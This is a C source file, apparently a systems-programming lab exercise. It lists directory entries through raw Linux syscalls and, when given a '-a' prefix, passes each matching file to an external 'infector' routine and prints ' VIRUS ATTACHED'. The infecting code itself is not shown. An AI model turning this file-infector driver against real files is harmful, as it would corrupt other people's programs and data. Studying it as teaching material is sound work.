#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define SYS_GETDENTS 141
#define O_RDONLY 0

#define BUF_SIZE 8192

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

extern int system_call();
extern void infection();
extern void infector(char *);

int main (int argc, char* argv[], char* envp[])  
{
    int fileDescriptor;
    int bytesRead;
    char buffer[BUF_SIZE];
    struct linux_dirent *d;
    int bytePosition;
    char* prefix = 0;
    int i;

   
   
    for(i = 1; i < argc; i++){
        if(argv[i][0] == '-' && argv[i][1] == 'a'){
            prefix = argv[i] + 2; 
        }
    }

    
    fileDescriptor = system_call(SYS_OPEN, ".", O_RDONLY, 0); 
    if (fileDescriptor < 0) {
        return 0x55;
    } 

    
    bytesRead = system_call(SYS_GETDENTS, fileDescriptor, buffer, BUF_SIZE);
    if (bytesRead < 0) {
        return 0x55;
    }

   
    for (bytePosition = 0; bytePosition < bytesRead; bytePosition += d->d_reclen) {
        
       
        d = (struct linux_dirent *) (buffer + bytePosition);
        
        
        if (prefix == 0) {
            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
       
        if (prefix != 0 && strncmp(d->d_name, prefix, strlen(prefix)) == 0)
        {
            
            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
            
            
            infector(d->d_name);
            
            
            system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }

       
       
    }
    return 0;
}